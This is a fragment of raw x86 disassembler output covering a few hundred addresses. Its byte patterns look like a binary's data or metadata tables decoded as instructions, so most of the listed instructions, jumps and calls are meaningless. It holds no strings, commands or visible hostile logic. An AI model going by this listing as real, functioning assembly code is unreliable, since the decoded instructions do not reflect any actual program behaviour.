  4063b9:	00 86 08 2a 14 95    	add    %al,-0x6aebd5f8(%esi)
  4063bf:	01 3a                	add    %edi,(%edx)
  4063c1:	00 12                	add    %dl,(%edx)
  4063c3:	24 00                	and    $0x0,%al
  4063c5:	00 00                	add    %al,(%eax)
  4063c7:	00 86 08 37 14 53    	add    %al,0x53143708(%esi)
  4063cd:	01 3a                	add    %edi,(%edx)
  4063cf:	00 1b                	add    %bl,(%ebx)
  4063d1:	24 00                	and    $0x0,%al
  4063d3:	00 00                	add    %al,(%eax)
  4063d5:	00 86 08 3d 1c 71    	add    %al,0x711c3d08(%esi)
  4063db:	01 3b                	add    %edi,(%ebx)
  4063dd:	00 23                	add    %ah,(%ebx)
  4063df:	24 00                	and    $0x0,%al
  4063e1:	00 00                	add    %al,(%eax)
  4063e3:	00 86 08 4b 1c 63    	add    %al,0x631c4b08(%esi)
  4063e9:	01 3b                	add    %edi,(%ebx)
  4063eb:	00 2c 24             	add    %ch,(%esp)
  4063ee:	00 00                	add    %al,(%eax)
  4063f0:	00 00                	add    %al,(%eax)
  4063f2:	86 08                	xchg   %cl,(%eax)
  4063f4:	86 20                	xchg   %ah,(%eax)
  4063f6:	75 01                	jne    0x4063f9
  4063f8:	3c 00                	cmp    $0x0,%al
  4063fa:	34 24                	xor    $0x24,%al
  4063fc:	00 00                	add    %al,(%eax)
  4063fe:	00 00                	add    %al,(%eax)
  406400:	86 08                	xchg   %cl,(%eax)
  406402:	92                   	xchg   %eax,%edx
  406403:	20 a3 01 3c 00 0c    	and    %ah,0xc003c01(%ebx)
  406409:	3e 00 00             	add    %al,%ds:(%eax)
  40640c:	00 00                	add    %al,(%eax)
  40640e:	86 08                	xchg   %cl,(%eax)
  406410:	c4 24 a8             	les    (%eax,%ebp,4),%esp
  406413:	01 3d 00 3d 24 00    	add    %edi,0x243d00
  406419:	00 00                	add    %al,(%eax)
  40641b:	00 86 08 bb 0f ad    	add    %al,-0x52f044f8(%esi)
  406421:	01 3d 00 45 24 00    	add    %edi,0x244500
  406427:	00 00                	add    %al,(%eax)
  406429:	00 e1                	add    %ah,%cl
  40642b:	01 00                	add    %eax,(%eax)
  40642d:	1d b2 01 3d 00       	sbb    $0x3d01b2,%eax
  406432:	52                   	push   %edx
  406433:	24 00                	and    $0x0,%al
  406435:	00 00                	add    %al,(%eax)
  406437:	00 86 18 37 1d 0e    	add    %al,0xe1d3718(%esi)
  40643d:	00 3d 00 64 3e 00    	add    %bh,0x3e6400
  406443:	00 00                	add    %al,(%eax)
  406445:	00 96 00 23 13 09    	add    %dl,0x9132300(%esi)
  40644b:	02 3d 00 65 24 00    	add    0x246500,%bh
  406451:	00 00                	add    %al,(%eax)
  406453:	00 96 00 af 07 10    	add    %dl,0x1007af00(%esi)
  406459:	02 3f                	add    (%edi),%bh
  40645b:	00 88 3e 00 00 00    	add    %cl,0x3e(%eax)
  406461:	00 96 00 77 14 16    	add    %dl,0x16147700(%esi)
  406467:	02 40 00             	add    0x0(%eax),%al
  40646a:	78 20                	js     0x40648c
  40646c:	00 00                	add    %al,(%eax)
  40646e:	00 00                	add    %al,(%eax)
  406470:	86 18                	xchg   %bl,(%eax)
  406472:	37                   	aaa
  406473:	1d 0e 00 42 00       	sbb    $0x42000e,%eax
  406478:	74 24                	je     0x40649e
  40647a:	00 00                	add    %al,(%eax)
  40647c:	00 00                	add    %al,(%eax)
  40647e:	96                   	xchg   %eax,%esi
  40647f:	00 96 14 1d 02 42    	add    %dl,0x42021d14(%esi)
  406485:	00 30                	add    %dh,(%eax)
  406487:	3f                   	aas
  406488:	00 00                	add    %al,(%eax)
  40648a:	00 00                	add    %al,(%eax)
  40648c:	96                   	xchg   %eax,%esi
  40648d:	00 a0 09 23 02 43    	add    %ah,0x43022309(%eax)
  406493:	00 e4                	add    %ah,%ah
  406495:	3f                   	aas
  406496:	00 00                	add    %al,(%eax)
  406498:	00 00                	add    %al,(%eax)
  40649a:	96                   	xchg   %eax,%esi
  40649b:	00 22                	add    %ah,(%edx)
  40649d:	26 2a 02             	sub    %es:(%edx),%al
  4064a0:	45                   	inc    %ebp
  4064a1:	00 81 24 00 00 00    	add    %al,0x24(%ecx)
  4064a7:	00 96 00 80 0a 32    	add    %dl,0x320a8000(%esi)
  4064ad:	02 47 00             	add    0x0(%edi),%al
  4064b0:	9c                   	pushf
  4064b1:	24 00                	and    $0x0,%al
  4064b3:	00 00                	add    %al,(%eax)
  4064b5:	00 96 00 0c 23 39    	add    %dl,0x39230c00(%esi)
  4064bb:	02 49 00             	add    0x0(%ecx),%cl
  4064be:	bc 24 00 00 00       	mov    $0x24,%esp
  4064c3:	00 96 00 32 23 40    	add    %dl,0x40233200(%esi)
  4064c9:	02 4b 00             	add    0x0(%ebx),%cl
  4064cc:	78 40                	js     0x40650e
  4064ce:	00 00                	add    %al,(%eax)
  4064d0:	00 00                	add    %al,(%eax)
  4064d2:	96                   	xchg   %eax,%esi
  4064d3:	00 44 09 47          	add    %al,0x47(%ecx,%ecx,1)
  4064d7:	02 4d 00             	add    0x0(%ebp),%cl
  4064da:	a8 40                	test   $0x40,%al
  4064dc:	00 00                	add    %al,(%eax)
  4064de:	00 00                	add    %al,(%eax)
  4064e0:	96                   	xchg   %eax,%esi
  4064e1:	00 94 08 4e 02 4f 00 	add    %dl,0x4f024e(%eax,%ecx,1)
  4064e8:	78 20                	js     0x40650a
  4064ea:	00 00                	add    %al,(%eax)
  4064ec:	00 00                	add    %al,(%eax)
  4064ee:	86 18                	xchg   %bl,(%eax)
  4064f0:	37                   	aaa
  4064f1:	1d 0e 00 51 00       	sbb    $0x51000e,%eax
  4064f6:	d4 41                	aam    $0x41
  4064f8:	00 00                	add    %al,(%eax)
  4064fa:	00 00                	add    %al,(%eax)
  4064fc:	96                   	xchg   %eax,%esi
  4064fd:	00 6a 09             	add    %ch,0x9(%edx)
  406500:	0a 00                	or     (%eax),%al
  406502:	51                   	push   %ecx
  406503:	00 78 20             	add    %bh,0x20(%eax)
  406506:	00 00                	add    %al,(%eax)
  406508:	00 00                	add    %al,(%eax)
  40650a:	86 18                	xchg   %bl,(%eax)
  40650c:	37                   	aaa
  40650d:	1d 0e 00 51 00       	sbb    $0x51000e,%eax
  406512:	d8 24 00             	fsubs  (%eax,%eax,1)
  406515:	00 00                	add    %al,(%eax)
  406517:	00 96 00 59 20 0a    	add    %dl,0xa205900(%esi)
  40651d:	00 51 00             	add    %dl,0x0(%ecx)
  406520:	00 45 00             	add    %al,0x0(%ebp)
  406523:	00 00                	add    %al,(%eax)
  406525:	00 91 00 60 15 1d    	add    %dl,0x1d156000(%ecx)
  40652b:	00 51 00             	add    %dl,0x0(%ecx)
  40652e:	4c                   	dec    %esp
  40652f:	45                   	inc    %ebp
  406530:	00 00                	add    %al,(%eax)
  406532:	00 00                	add    %al,(%eax)
  406534:	91                   	xchg   %eax,%ecx
  406535:	00 5e 0d             	add    %bl,0xd(%esi)
  406538:	1d 00 51 00 90       	sbb    $0x90005100,%eax
  40653d:	45                   	inc    %ebp
  40653e:	00 00                	add    %al,(%eax)
  406540:	00 00                	add    %al,(%eax)
  406542:	91                   	xchg   %eax,%ecx
  406543:	00 92 06 1d 00 51    	add    %dl,0x51001d06(%edx)
  406549:	00 a0 46 00 00 00    	add    %ah,0x46(%eax)
  40654f:	00 91 00 41 13 1d    	add    %dl,0x1d134100(%ecx)
  406555:	00 51 00             	add    %dl,0x0(%ecx)
  406558:	dc 46 00             	faddl  0x0(%esi)
  40655b:	00 00                	add    %al,(%eax)
  40655d:	00 91 00 5d 09 1d    	add    %dl,0x1d095d00(%ecx)
  406563:	00 51 00             	add    %dl,0x0(%ecx)
  406566:	00 00                	add    %al,(%eax)
  406568:	00 00                	add    %al,(%eax)
  40656a:	80 00 96             	addb   $0x96,(%eax)
  40656d:	20 05 04 55 02 51    	and    %al,0x51025504
  406573:	00 00                	add    %al,(%eax)
  406575:	00 00                	add    %al,(%eax)
  406577:	00 80 00 91 20 2e    	add    %al,0x2e209100(%eax)
  40657d:	17                   	pop    %ss
  40657e:	5a                   	pop    %edx
  40657f:	02 52 00             	add    0x0(%edx),%dl
  406582:	78 20                	js     0x4065a4
  406584:	00 00                	add    %al,(%eax)
  406586:	00 00                	add    %al,(%eax)
  406588:	86 18                	xchg   %bl,(%eax)
  40658a:	37                   	aaa
  40658b:	1d 0e 00 54 00       	sbb    $0x54000e,%eax
  406590:	1c 47                	sbb    $0x47,%al
  406592:	00 00                	add    %al,(%eax)
  406594:	00 00                	add    %al,(%eax)
  406596:	86 00                	xchg   %al,(%eax)
  406598:	bb 04 95 01 54       	mov    $0x54019504,%ebx
  40659d:	00 a0 47 00 00 00    	add    %ah,0x47(%eax)
  4065a3:	00 86 00 4e 24 61    	add    %al,0x61244e00(%esi)
  4065a9:	02 54 00 78          	add    0x78(%eax,%eax,1),%dl
  4065ad:	20 00                	and    %al,(%eax)
  4065af:	00 00                	add    %al,(%eax)
  4065b1:	00 86 18 37 1d 0e    	add    %al,0xe1d3718(%esi)
  4065b7:	00 55 00             	add    %dl,0x0(%ebp)
  4065ba:	44                   	inc    %esp
  4065bb:	48                   	dec    %eax
  4065bc:	00 00                	add    %al,(%eax)
  4065be:	00 00                	add    %al,(%eax)
  4065c0:	96                   	xchg   %eax,%esi
  4065c1:	00 fd                	add    %bh,%ch
  4065c3:	16                   	push   %ss
  4065c4:	67 02 55 00          	add    0x0(%di),%dl
  4065c8:	c0 48 00 00          	rorb   $0x0,0x0(%eax)
  4065cc:	00 00                	add    %al,(%eax)
  4065ce:	96                   	xchg   %eax,%esi
  4065cf:	00 87 0b 6b 02 55    	add    %al,0x55026b0b(%edi)
  4065d5:	00 28                	add    %ch,(%eax)
  4065d7:	49                   	dec    %ecx
  4065d8:	00 00                	add    %al,(%eax)
  4065da:	00 00                	add    %al,(%eax)
  4065dc:	96                   	xchg   %eax,%esi
  4065dd:	00 51 05             	add    %dl,0x5(%ecx)
  4065e0:	53                   	push   %ebx
  4065e1:	00 56 00             	add    %dl,0x0(%esi)
  4065e4:	03 25 00 00 00 00    	add    0x0,%esp
  4065ea:	96                   	xchg   %eax,%esi
  4065eb:	00 2e                	add    %ch,(%esi)
  4065ed:	02 1d 00 56 00 e8    	add    0xe8005600,%bl
  4065f3:	4a                   	dec    %edx
  4065f4:	00 00                	add    %al,(%eax)
  4065f6:	00 00                	add    %al,(%eax)
  4065f8:	96                   	xchg   %eax,%esi
  4065f9:	00 ab 03 0a 00 56    	add    %ch,0x56000a03(%ebx)
  4065ff:	00 48 4b             	add    %cl,0x4b(%eax)
  406602:	00 00                	add    %al,(%eax)
  406604:	00 00                	add    %al,(%eax)
  406606:	96                   	xchg   %eax,%esi
  406607:	00 62 0b             	add    %ah,0xb(%edx)
  40660a:	67 02 56 00          	add    0x0(%bp),%dl
  40660e:	1c 4c                	sbb    $0x4c,%al
  406610:	00 00                	add    %al,(%eax)
  406612:	00 00                	add    %al,(%eax)
  406614:	96                   	xchg   %eax,%esi
  406615:	00 1c 04             	add    %bl,(%esp,%eax,1)
  406618:	79 02                	jns    0x40661c
  40661a:	56                   	push   %esi
  40661b:	00 00                	add    %al,(%eax)
  40661d:	00 00                	add    %al,(%eax)
  40661f:	00 80 00 96 20 f4    	add    %al,-0xbdf6a00(%eax)
  406625:	02 80 02 57 00 58    	add    0x58005702(%eax),%al
  40662b:	4c                   	dec    %esp
  40662c:	00 00                	add    %al,(%eax)
  40662e:	00 00                	add    %al,(%eax)
  406630:	96                   	xchg   %eax,%esi
  406631:	00 46 0d             	add    %al,0xd(%esi)
  406634:	0a 00                	or     (%eax),%al
  406636:	58                   	pop    %eax
  406637:	00 88 4c 00 00 00    	add    %cl,0x4c(%eax)
  40663d:	00 96 00 37 16 1d    	add    %dl,0x1d163700(%esi)
  406643:	00 58 00             	add    %bl,0x0(%eax)
  406646:	19 25 00 00 00 00    	sbb    %esp,0x0
  40664c:	96                   	xchg   %eax,%esi
  40664d:	00 18                	add    %bl,(%eax)
  40664f:	06                   	push   %es
  406650:	0a 00                	or     (%eax),%al
  406652:	58                   	pop    %eax
  406653:	00 32                	add    %dh,(%edx)
  406655:	25 00 00 00 00       	and    $0x0,%eax
  40665a:	96                   	xchg   %eax,%esi
  40665b:	00 9b 0a 97 02 58    	add    %bl,0x5802970a(%ebx)
  406661:	00 a8 4c 00 00 00    	add    %ch,0x4c(%eax)
  406667:	00 96 00 29 04 0a    	add    %dl,0xa042900(%esi)
  40666d:	00 5a 00             	add    %bl,0x0(%edx)
  406670:	e8 4c 00 00 00       	call   0x4066c1
  406675:	00 96 00 03 26 0a    	add    %dl,0xa260300(%esi)
  40667b:	00 5a 00             	add    %bl,0x0(%edx)
  40667e:	00 00                	add    %al,(%eax)
  406680:	00 00                	add    %al,(%eax)
  406682:	80 00 91             	addb   $0x91,(%eax)
  406685:	20 0c 09             	and    %cl,(%ecx,%ecx,1)
  406688:	9e                   	sahf
  406689:	02 5a 00             	add    0x0(%edx),%bl
  40668c:	1c 4d                	sbb    $0x4d,%al
  40668e:	00 00                	add    %al,(%eax)
  406690:	00 00                	add    %al,(%eax)
  406692:	96                   	xchg   %eax,%esi
  406693:	00 91 24 a5 02 5d    	add    %dl,0x5d02a524(%ecx)
  406699:	00 7c 4d 00          	add    %bh,0x0(%ebp,%ecx,2)
  40669d:	00 00                	add    %al,(%eax)
  40669f:	00 96 00 2b 03 6b    	add    %dl,0x6b032b00(%esi)
  4066a5:	02 5f 00             	add    0x0(%edi),%bl
  4066a8:	e0 4d                	loopne 0x4066f7
  4066aa:	00 00                	add    %al,(%eax)
  4066ac:	00 00                	add    %al,(%eax)
  4066ae:	96                   	xchg   %eax,%esi
  4066af:	00 af 06 84 00 60    	add    %ch,0x60008406(%edi)
  4066b5:	00 40 4e             	add    %al,0x4e(%eax)
  4066b8:	00 00                	add    %al,(%eax)
  4066ba:	00 00                	add    %al,(%eax)
  4066bc:	96                   	xchg   %eax,%esi
  4066bd:	00 06                	add    %al,(%esi)
  4066bf:	05 1d 00 61 00       	add    $0x61001d,%eax
  4066c4:	4c                   	dec    %esp
  4066c5:	25 00 00 00 00       	and    $0x0,%eax
  4066ca:	91                   	xchg   %eax,%ecx
  4066cb:	18 3d 1d 0a 00 61    	sbb    %bh,0x61000a1d
  4066d1:	00 a4 4e 00 00 00 00 	add    %ah,0x0(%esi,%ecx,2)
  4066d8:	96                   	xchg   %eax,%esi
  4066d9:	00 c7                	add    %al,%bh
  4066db:	09 9a 00 61 00 c0    	or     %ebx,-0x3fff9f00(%edx)
  4066e1:	50                   	push   %eax
  4066e2:	00 00                	add    %al,(%eax)
  4066e4:	00 00                	add    %al,(%eax)
  4066e6:	91                   	xchg   %eax,%ecx
  4066e7:	00 f4                	add    %dh,%ah
  4066e9:	22 ab 02 62 00 62    	and    0x62006202(%ebx),%ch
  4066ef:	25 00 00 00 00       	and    $0x0,%eax
  4066f4:	91                   	xchg   %eax,%ecx
  4066f5:	00 51 0d             	add    %dl,0xd(%ecx)
  4066f8:	0a 00                	or     (%eax),%al
  4066fa:	63 00                	arpl   %eax,(%eax)
  4066fc:	92                   	xchg   %eax,%edx
  4066fd:	25 00 00 00 00       	and    $0x0,%eax
  406702:	96                   	xchg   %eax,%esi
  406703:	00 e9                	add    %ch,%cl
  406705:	07                   	pop    %es
  406706:	b1 02                	mov    $0x2,%cl
  406708:	63 00                	arpl   %eax,(%eax)
  40670a:	c9                   	leave
  40670b:	25 00 00 00 00       	and    $0x0,%eax
  406710:	91                   	xchg   %eax,%ecx
  406711:	18 3d 1d 0a 00 64    	sbb    %bh,0x64000a1d
  406717:	00 e8                	add    %ch,%al
  406719:	51                   	push   %ecx
  40671a:	00 00                	add    %al,(%eax)
  40671c:	00 00                	add    %al,(%eax)
  40671e:	86 18                	xchg   %bl,(%eax)
  406720:	37                   	aaa
  406721:	1d 53 01 64 00       	sbb    $0x640153,%eax
  406726:	d5 25                	aad    $0x25
  406728:	00 00                	add    %al,(%eax)
  40672a:	00 00                	add    %al,(%eax)
  40672c:	86 00                	xchg   %al,(%eax)
  40672e:	07                   	pop    %es
  40672f:	08 de                	or     %bl,%dh
  406731:	02 65 00             	add    0x0(%ebp),%ah
  406734:	58                   	pop    %eax
  406735:	52                   	push   %edx
  406736:	00 00                	add    %al,(%eax)
  406738:	00 00                	add    %al,(%eax)
  40673a:	86 00                	xchg   %al,(%eax)
  40673c:	4b                   	dec    %ebx
  40673d:	20 e3                	and    %ah,%bl
  40673f:	02 66 00             	add    0x0(%esi),%ah
  406742:	ed                   	in     (%dx),%eax
  406743:	25 00 00 00 00       	and    $0x0,%eax
  406748:	86 00                	xchg   %al,(%eax)
  40674a:	ac                   	lods   %ds:(%esi),%al
  40674b:	09 de                	or     %ebx,%esi
  40674d:	02 67 00             	add    0x0(%edi),%ah
  406750:	98                   	cwtl
  406751:	53                   	push   %ebx
  406752:	00 00                	add    %al,(%eax)
  406754:	00 00                	add    %al,(%eax)
  406756:	86 00                	xchg   %al,(%eax)
  406758:	ca 08 e3             	lret   $0xe308
  40675b:	02 68 00             	add    0x0(%eax),%ch
  40675e:	40                   	inc    %eax
  40675f:	55                   	push   %ebp
  406760:	00 00                	add    %al,(%eax)
  406762:	48                   	dec    %eax
  406763:	00 81 00 8f 05 ea    	add    %al,-0x15fa7100(%ecx)
  406769:	02 69 00             	add    0x0(%ecx),%ch
  40676c:	05 26 00 00 00       	add    $0x26,%eax
  406771:	00 91 18 3d 1d 0a    	add    %dl,0xa1d3d18(%ecx)
  406777:	00 6b 00             	add    %ch,0x0(%ebx)
  40677a:	68 55 00 00 00       	push   $0x55
  40677f:	00 96 00 85 14 6b    	add    %dl,0x6b148500(%esi)
  406785:	02 6b 00             	add    0x0(%ebx),%ch
  406788:	ec                   	in     (%dx),%al
  406789:	55                   	push   %ebp
  40678a:	00 00                	add    %al,(%eax)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	96                   	xchg   %eax,%esi
  40678f:	00 fc                	add    %bh,%ah
  406791:	12 d3                	adc    %bl,%dl
  406793:	00 6c 00 24          	add    %ch,0x24(%eax,%eax,1)
  406797:	56                   	push   %esi
  406798:	00 00                	add    %al,(%eax)
  40679a:	00 00                	add    %al,(%eax)
  40679c:	96                   	xchg   %eax,%esi
  40679d:	00 c5                	add    %al,%ch
  40679f:	1a d3                	sbb    %bl,%dl
  4067a1:	00 6d 00             	add    %ch,0x0(%ebp)
  4067a4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4067a5:	56                   	push   %esi
  4067a6:	00 00                	add    %al,(%eax)
  4067a8:	00 00                	add    %al,(%eax)
  4067aa:	96                   	xchg   %eax,%esi
  4067ab:	00 a5 23 d3 00 6e    	add    %ah,0x6e00d323(%ebp)
  4067b1:	00 00                	add    %al,(%eax)
  4067b3:	00 01                	add    %al,(%ecx)
  4067b5:	00 ce                	add    %cl,%dh
  4067b7:	22 00                	and    (%eax),%al
  4067b9:	00 01                	add    %al,(%ecx)
  4067bb:	00 5f 08             	add    %bl,0x8(%edi)
  4067be:	00 00                	add    %al,(%eax)
  4067c0:	01 00                	add    %eax,(%eax)
  4067c2:	01 06                	add    %eax,(%esi)
  4067c4:	00 00                	add    %al,(%eax)
  4067c6:	01 00                	add    %eax,(%eax)
  4067c8:	fa                   	cli
  4067c9:	03 00                	add    (%eax),%eax
  4067cb:	00 01                	add    %al,(%ecx)
  4067cd:	00 ce                	add    %cl,%dh
  4067cf:	00 00                	add    %al,(%eax)
  4067d1:	00 01                	add    %al,(%ecx)
  4067d3:	00 60 05             	add    %ah,0x5(%eax)
  4067d6:	00 00                	add    %al,(%eax)
  4067d8:	01 00                	add    %eax,(%eax)
  4067da:	bf 01 00 00 01       	mov    $0x1000001,%edi
  4067df:	00 d2                	add    %dl,%dl
  4067e1:	20 00                	and    %al,(%eax)
  4067e3:	00 01                	add    %al,(%ecx)
  4067e5:	00 ee                	add    %ch,%dh
  4067e7:	09 00                	or     %eax,(%eax)
  4067e9:	00 01                	add    %al,(%ecx)
  4067eb:	00 dd                	add    %bl,%ch
  4067ed:	07                   	pop    %es
  4067ee:	00 00                	add    %al,(%eax)
  4067f0:	01 00                	add    %eax,(%eax)
  4067f2:	18 0a                	sbb    %cl,(%edx)
  4067f4:	00 00                	add    %al,(%eax)
  4067f6:	02 00                	add    (%eax),%al
  4067f8:	0e                   	push   %cs
  4067f9:	24 00                	and    $0x0,%al
  4067fb:	00 03                	add    %al,(%ebx)
  4067fd:	00 a0 02 00 00 04    	add    %ah,0x4000002(%eax)
  406803:	00 d7                	add    %dl,%bh
  406805:	08 00                	or     %al,(%eax)
  406807:	00 01                	add    %al,(%ecx)
  406809:	00 7e 1d             	add    %bh,0x1d(%esi)
  40680c:	00 00                	add    %al,(%eax)
  40680e:	01 00                	add    %eax,(%eax)
  406810:	80 1a 00             	sbbb   $0x0,(%edx)
  406813:	00 01                	add    %al,(%ecx)
  406815:	00 06                	add    %al,(%esi)
  406817:	02 00                	add    (%eax),%al
  406819:	00 01                	add    %al,(%ecx)
  40681b:	00 67 02             	add    %ah,0x2(%edi)
  40681e:	00 00                	add    %al,(%eax)
  406820:	01 00                	add    %eax,(%eax)
  406822:	f5                   	cmc
  406823:	23 00                	and    (%eax),%eax
  406825:	00 01                	add    %al,(%ecx)
  406827:	00 56 0a             	add    %dl,0xa(%esi)
  40682a:	00 00                	add    %al,(%eax)
  40682c:	01 00                	add    %eax,(%eax)
  40682e:	5d                   	pop    %ebp
  40682f:	06                   	push   %es
  406830:	00 00                	add    %al,(%eax)
  406832:	01 00                	add    %eax,(%eax)
  406834:	ba 09 00 00 01       	mov    $0x1000009,%edx
  406839:	00 8f 1a 00 00 01    	add    %cl,0x100001a(%edi)
  40683f:	00 a5 01 00 00 01    	add    %ah,0x1000001(%ebp)
  406845:	00 84 02 00 00 01 00 	add    %al,0x10000(%edx,%eax,1)
  40684c:	7b 03                	jnp    0x406851
  40684e:	00 00                	add    %al,(%eax)
  406850:	01 00                	add    %eax,(%eax)
  406852:	b8 1a 00 00 01       	mov    $0x100001a,%eax
  406857:	00 1f                	add    %bl,(%edi)
  406859:	01 00                	add    %eax,(%eax)
  40685b:	00 01                	add    %al,(%ecx)
  40685d:	00 31                	add    %dh,(%ecx)
  40685f:	1b 00                	sbb    (%eax),%eax
  406861:	00 02                	add    %al,(%edx)
  406863:	00 f3                	add    %dh,%bl
  406865:	08 00                	or     %al,(%eax)
  406867:	00 01                	add    %al,(%ecx)
  406869:	00 c7                	add    %al,%bh
  40686b:	19 00                	sbb    %eax,(%eax)
  40686d:	00 01                	add    %al,(%ecx)
  40686f:	00 f9                	add    %bh,%cl
  406871:	07                   	pop    %es
  406872:	00 00                	add    %al,(%eax)
  406874:	01 00                	add    %eax,(%eax)
  406876:	e6 05                	out    %al,$0x5
  406878:	00 00                	add    %al,(%eax)
  40687a:	01 00                	add    %eax,(%eax)
  40687c:	7f 05                	jg     0x406883
  40687e:	00 00                	add    %al,(%eax)
  406880:	01 00                	add    %eax,(%eax)
  406882:	a2 04 00 00 01       	mov    %al,0x1000004
  406887:	00 e1                	add    %ah,%cl
  406889:	09 00                	or     %eax,(%eax)
  40688b:	00 01                	add    %al,(%ecx)
  40688d:	00 38                	add    %bh,(%eax)
  40688f:	03 00                	add    (%eax),%eax
  406891:	00 01                	add    %al,(%ecx)
  406893:	00 4f 06             	add    %cl,0x6(%edi)
  406896:	00 00                	add    %al,(%eax)
  406898:	01 00                	add    %eax,(%eax)
  40689a:	d2 12                	rclb   %cl,(%edx)
  40689c:	00 00                	add    %al,(%eax)
  40689e:	01 00                	add    %eax,(%eax)
  4068a0:	2f                   	das
  4068a1:	26 00 00             	add    %al,%es:(%eax)
  4068a4:	01 00                	add    %eax,(%eax)
  4068a6:	4e                   	dec    %esi
  4068a7:	13 00                	adc    (%eax),%eax
  4068a9:	00 01                	add    %al,(%ecx)
  4068ab:	00 f7                	add    %dh,%bh
  4068ad:	06                   	push   %es
  4068ae:	00 00                	add    %al,(%eax)
  4068b0:	01 00                	add    %eax,(%eax)
  4068b2:	63 16                	arpl   %edx,(%esi)
  4068b4:	00 00                	add    %al,(%eax)
  4068b6:	02 00                	add    (%eax),%al
  4068b8:	e9 03 00 00 01       	jmp    0x14068c0
  4068bd:	00 96 0b 00 00 02    	add    %dl,0x200000b(%esi)
  4068c3:	00 32                	add    %dh,(%edx)
  4068c5:	0a 00                	or     (%eax),%al
  4068c7:	00 01                	add    %al,(%ecx)
  4068c9:	00 c2                	add    %al,%dl
  4068cb:	25 00 00 01 00       	and    $0x10000,%eax
  4068d0:	4c                   	dec    %esp
  4068d1:	23 00                	and    (%eax),%eax
  4068d3:	00 01                	add    %al,(%ecx)
  4068d5:	00 30                	add    %dh,(%eax)
  4068d7:	13 00                	adc    (%eax),%eax
  4068d9:	00 01                	add    %al,(%ecx)
  4068db:	00 d4                	add    %dl,%ah
  4068dd:	02 00                	add    (%eax),%al
  4068df:	00 01                	add    %al,(%ecx)
  4068e1:	00 45 01             	add    %al,0x1(%ebp)
  4068e4:	00 00                	add    %al,(%eax)
  4068e6:	01 00                	add    %eax,(%eax)
  4068e8:	00 24 00             	add    %ah,(%eax,%eax,1)
  4068eb:	00 01                	add    %al,(%ecx)
  4068ed:	00 42 1b             	add    %al,0x1b(%edx)
  4068f0:	00 00                	add    %al,(%eax)
  4068f2:	01 00                	add    %eax,(%eax)
  4068f4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4068f5:	0a 00                	or     (%eax),%al
  4068f7:	00 01                	add    %al,(%ecx)
  4068f9:	00 e0                	add    %ah,%al
  4068fb:	12 00                	adc    (%eax),%al
  4068fd:	00 01                	add    %al,(%ecx)
  4068ff:	00 5b 07             	add    %bl,0x7(%ebx)
  406902:	00 00                	add    %al,(%eax)
  406904:	01 00                	add    %eax,(%eax)
  406906:	67 24 00             	addr16 and $0x0,%al
  406909:	00 01                	add    %al,(%ecx)
  40690b:	00 88 15 00 00 01    	add    %cl,0x1000015(%eax)
  406911:	00 0c 06             	add    %cl,(%esi,%eax,1)
  406914:	00 00                	add    %al,(%eax)
  406916:	01 00                	add    %eax,(%eax)
  406918:	0a 13                	or     (%ebx),%dl
  40691a:	00 00                	add    %al,(%eax)
  40691c:	01 00                	add    %eax,(%eax)
  40691e:	32 15 00 00 02 00    	xor    0x20000,%dl
  406924:	67 07                	addr16 pop %es
  406926:	00 00                	add    %al,(%eax)
  406928:	01 00                	add    %eax,(%eax)
  40692a:	02 07                	add    (%edi),%al
  40692c:	00 00                	add    %al,(%eax)
  40692e:	01 00                	add    %eax,(%eax)
  406930:	75 04                	jne    0x406936
  406932:	00 00                	add    %al,(%eax)
  406934:	02 00                	add    (%eax),%al
  406936:	a1 15 00 00 01       	mov    0x1000015,%eax
  40693b:	00 dd                	add    %bl,%ch
  40693d:	23 00                	and    (%eax),%eax
  40693f:	00 01                	add    %al,(%ecx)
  406941:	00 3a                	add    %bh,(%edx)
  406943:	24 00                	and    $0x0,%al
  406945:	00 02                	add    %al,(%edx)
  406947:	00 41 23             	add    %al,0x23(%ecx)
  40694a:	00 00                	add    %al,(%eax)
  40694c:	01 00                	add    %eax,(%eax)
  40694e:	4b                   	dec    %ebx
  40694f:	02 00                	add    (%eax),%al
  406951:	00 02                	add    %al,(%edx)
  406953:	00 29                	add    %ch,(%ecx)
  406955:	16                   	push   %ss
  406956:	00 00                	add    %al,(%eax)
  406958:	01 00                	add    %eax,(%eax)
  40695a:	d3 09                	rorl   %cl,(%ecx)
  40695c:	00 00                	add    %al,(%eax)
  40695e:	02 00                	add    (%eax),%al
  406960:	e8 23 00 00 01       	call   0x1406988
  406965:	00 d1                	add    %dl,%cl
  406967:	25 00 00 02 00       	and    $0x20000,%eax
  40696c:	fb                   	sti
  40696d:	17                   	pop    %ss
  40696e:	00 00                	add    %al,(%eax)
  406970:	01 00                	add    %eax,(%eax)
  406972:	8d 0a                	lea    (%edx),%ecx
  406974:	00 00                	add    %al,(%eax)
  406976:	02 00                	add    (%eax),%al
  406978:	51                   	push   %ecx
  406979:	04 00                	add    $0x0,%al
  40697b:	00 01                	add    %al,(%ecx)
  40697d:	00 ae 04 00 00 02    	add    %ch,0x2000004(%esi)
  406983:	00 57 0b             	add    %dl,0xb(%edi)
  406986:	00 00                	add    %al,(%eax)
  406988:	01 00                	add    %eax,(%eax)
  40698a:	6c                   	insb   (%dx),%es:(%edi)
  40698b:	15 00 00 02 00       	adc    $0x20000,%eax
  406990:	a0 24 00 00 01       	mov    0x1000024,%al
  406995:	00 80 23 00 00 01    	add    %al,0x1000023(%eax)
  40699b:	00 0d 07 00 00 02    	add    %cl,0x2000007
  4069a1:	00 d2                	add    %dl,%dl
  4069a3:	19 00                	sbb    %eax,(%eax)
  4069a5:	00 01                	add    %al,(%ecx)
  4069a7:	00 5a 24             	add    %bl,0x24(%edx)
  4069aa:	00 00                	add    %al,(%eax)
  4069ac:	01 00                	add    %eax,(%eax)
  4069ae:	74 23                	je     0x4069d3
  4069b0:	00 00                	add    %al,(%eax)
  4069b2:	01 00                	add    %eax,(%eax)
  4069b4:	25 0a 00 00 01       	and    $0x100000a,%eax
  4069b9:	00 45 03             	add    %al,0x3(%ebp)
  4069bc:	00 00                	add    %al,(%eax)
  4069be:	01 00                	add    %eax,(%eax)
  4069c0:	7a 09                	jp     0x4069cb
  4069c2:	00 00                	add    %al,(%eax)
  4069c4:	02 00                	add    (%eax),%al
  4069c6:	cd 07                	int    $0x7
  4069c8:	00 00                	add    %al,(%eax)
  4069ca:	01 00                	add    %eax,(%eax)
  4069cc:	c2 05 00             	ret    $0x5
  4069cf:	00 02                	add    %al,(%edx)
